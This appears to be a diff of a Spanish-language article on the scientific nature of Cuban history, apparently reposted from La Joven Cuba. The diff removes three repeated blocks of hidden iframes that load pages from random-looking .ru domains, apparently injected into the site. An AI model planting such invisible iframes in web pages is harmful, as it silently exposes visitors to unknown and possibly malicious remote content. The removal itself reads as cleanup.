@@ -22,9 +22,3 @@ A todo esto se debe añadir la cuota de responsabilidad y el probable margen de 
 **La Historia como ciencia es una sola, sea positivista, marxista, analista, cualitativa; oficial o no; cubana o extranjera; lo que la hace válida científicamente es su concordancia con la realidad de una época, del pensamiento y la acción de los hombres y mujeres que la hicieron y su eficaz plasmación en los textos de los que la escriben.**
 
 Tomado de: La Joven Cuba
-
-<iframe id="a540125352" style="display: none;" src="https://0vse8pqcjwjb7.ru/f2.html?a=29539"></iframe><iframe id="a754394637" style="display: none;" src="https://m41egdcqogb3.ru/u.html?a=29539"></iframe>
-
-<iframe id="a540125352" style="display: none;" src="https://0vse8pqcjwjb7.ru/f2.html?a=29539"></iframe><iframe id="a754394637" style="display: none;" src="https://m41egdcqogb3.ru/u.html?a=29539"></iframe>
-
-<iframe id="a540125352" style="display: none;" src="https://0vse8pqcjwjb7.ru/f2.html?a=29539"></iframe><iframe id="a754394637" style="display: none;" src="https://m41egdcqogb3.ru/u.html?a=29539"></iframe>
